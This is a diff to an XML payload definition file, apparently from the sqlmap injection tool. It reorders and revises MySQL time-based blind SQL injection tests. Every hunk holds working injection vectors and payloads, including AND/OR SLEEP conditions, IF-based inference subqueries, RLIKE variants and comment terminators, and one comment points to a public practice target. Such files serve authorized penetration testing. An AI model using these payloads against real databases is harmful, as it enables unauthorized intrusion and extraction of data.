@@ -2,98 +2,18 @@
 
 <root>
     <!-- Time-based boolean tests -->
-    <test>
-        <title>MySQL &gt;= 5.0.12 AND time-based blind</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1,2,3,8,9</clause>
-        <where>1</where>
-        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>AND SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
 
-    <test>
-        <title>MySQL &gt;= 5.0.12 OR time-based blind</title>
-        <stype>5</stype>
-        <level>1</level>
-        <risk>3</risk>
-        <clause>1,2,3,9</clause>
-        <where>1</where>
-        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>OR SLEEP([SLEEPTIME])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0.12 AND time-based blind (comment)</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3,9</clause>
-        <where>1</where>
-        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>AND SLEEP([SLEEPTIME])</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0.12 OR time-based blind (comment)</title>
-        <stype>5</stype>
-        <level>3</level>
-        <risk>3</risk>
-        <clause>1,2,3,9</clause>
-        <where>1</where>
-        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
-        <request>
-            <payload>OR SLEEP([SLEEPTIME])</payload>
-            <comment>#</comment>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0.12</dbms_version>
-        </details>
-    </test>
-
+    <!-- Prefering "query SLEEP" over "SLEEP" because of JOIN-alike cases where SLEEPs get called multiple times (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1) -->
     <test>
         <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</title>
         <stype>5</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -107,13 +27,95 @@
     <test>
         <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</title>
         <stype>5</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>AND SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</title>
+        <stype>5</stype>
         <level>2</level>
         <risk>3</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
         <request>
-            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>OR SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>AND SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>OR SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -131,9 +133,9 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -152,9 +154,9 @@
         <risk>3</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -296,9 +298,9 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -316,9 +318,9 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>1</where>
-        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -1490,9 +1492,9 @@
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
-        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <vector>(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
-            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
